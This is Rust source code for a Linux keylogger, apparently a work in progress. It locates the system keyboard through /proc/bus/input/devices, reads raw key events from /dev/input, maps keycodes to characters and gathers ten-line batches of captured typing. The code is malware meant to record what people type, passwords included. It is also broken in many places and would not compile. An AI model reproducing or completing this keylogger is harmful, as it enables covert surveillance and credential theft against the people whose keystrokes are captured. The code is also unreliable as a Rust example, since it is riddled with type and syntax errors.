use nix::fcntl::OFlag;
use nix::sys::*;
use nix::unistd::open;
use std::any::TypeId;
use std::fs::File;
use std::io::{self, BufRead, BufReader, Read};
use std::mem;
use std::os::unix::io::RawFd;
use std::slice;

const DEVICES: &str = "/proc/bus/input/devices";
const LOGFILE: &str = "/tmp/data";
const INPUTSTREAM: &str = "/dev/input/";
const BUFFER_SIZE: i32 = 64;
const BUFFER_SOFT_CAP: i32 = 25;
const BUFFER_INCREASE: i32 = 2;
const BUFFER_GOAL: i32 = 10;

static KEYMAP: [&str; 60] = [
    "",
    "",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8", // 0-9
    "9",
    "0",
    "-",
    "=",
    "",
    "",
    "q",
    "w",
    "e",
    "r", // 10-19
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "[",
    "]",
    "n",
    "", // 20-29
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    ";", // 30-39
    "'",
    "`",
    "",
    "",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n", // 40-49
    "m",
    ",",
    ".",
    "/",
    "",
    "*",
    "[LEFT_ALT]",
    " ",
    "",
    "", // 50-59
];

fn checkFileExists(file: Result<File, std::io::Error>) -> i32 {
    match file {
        Ok(_) => return 1,
        Err(_) => return 0,
    }
}

fn getEvent() -> Option<&'static str> {
    // setting return as result as it will be good for returning null
    // values
    let file = File::open(DEVICES).ok()?;
    let filecheck = checkFileExists(&file);

    if filecheck == 0 {
        return None;
    }

    let mut line: &str; // char method because rust char only supports 32 bit
    let mut finalToken: &str; // initalized token for memory relation
    let mut reached_keyboard: i32 = 0;

    if let Some(file) = Some(file) {
        let reader = BufReader::new(file);

        for line in reader.lines() {
            let line = line.unwrap();

            if line.find("AT Translated Set 2 Keyboard").is_some() {
                reached_keyboard = 1
            };

            let mut token: Vec<&str> = &line.split('=').collect();

            finalToken = &token[0];
        }

        if line.find("I:") {
            reached_keyboard = 0
        }
    }

    Some(finalToken)
}

struct InputEvent {
    code: u16,
    value: i32,
}

fn interpretCharacter(
    outputBuffer: &mut [i32],
    InputEvent: &InputEvent,
    bufferIndex: &mut usize,
) -> i32 {
    static shiftPressed: i32 = 0;
    static capsEnabled: bool;

    match InputEvent.code {
        KEY_BACKSPACE => {
            if *bufferIndex > 0 {
                *bufferIndex -= 1;
            }

            return 0;
        }
        KEY_ENTER => {
            if *bufferIndex < outputBuffer.len() {
                outputBuffer[*bufferIndex] = b'\n' as i32;
                *bufferIndex += 1;
            }
            return -1;
        }
        KEY_RIGHTSHIFT => {
            if InputEvent.value != 0 {
                shiftPressed = 1; // Type is returning unit type and not i32 fix tomorrow
                !todo() //
            };
        }
        KEY_CAPSLOCK => {
            if InputEvent.value = 1 {
                capsEnabled = !capsEnabled;
            }
        }
    }
}

fn inputBuffer(argc: i32, argv: &str, eventName: &str, temporaryBufferCount: i32) {
    let mut outputBuffer: Vec<char> = Vec::with_capacity(BUFFER_SIZE);
    let mut bufferIndex = 0;
    let mut currentBuffer = BUFFER_SIZE;

    let fileNameBuffer = INPUTSTREAM;
    let result = &fileNameBuffer + &eventName;
    let inputLogger: i32 = open(fileNameBuffer, OFlag::O_RDONLY);
    let event_input = InputEvent { code: 0, value: 0 };
    loop {
        &inputLogger.read_exact(&mut event_input)?;
        if TypeId::of::<i32>() == TypeId::of_val(&event_input) {
            let result: i32 = interpretCharacter(outputBuffer, &event_input, &bufferIndex);
            match result {
                1 => break,
                0 => break,
                -1 => return outputBuffer,
            }
        }

        if bufferIndex > (currentBuffer - BUFFER_SOFT_CAP) {
            currentBuffer *= 2;
            *temporaryBufferCount *= 2;
        }
    }
}

fn keylogBufferReceive(argc: i32, argv: &str, eventFileName: &str) {
    let mut linebuffer: &str;
    let mut lineCounter: i32 = 0;

    while lineCounter <= BUFFER_GOAL {
        let mut temporaryBufferCount: i32 = BUFFER_SIZE;
        let mut receivedBuffer: &str =
            inputBuffer(argc, argv, eventFileName, &temporaryBufferCount);

        let result = linebuffer + receivedBuffer;

        if receivedBuffer != None {
            receivedBuffer = None;
        }

        lineCounter += 1;
    }
    return &linebuffer;
}

fn main() {
    let result: &str = getEvent();
    let mut keyLogBuffer = None;

    loop {
        keyLogBuffer = keylogBufferReceive(argc, argv, result);
        println!("Ten Line Buffer: {}", keyLogBuffer);

        keyLogBuffer = None;
    }

    result = None;
}
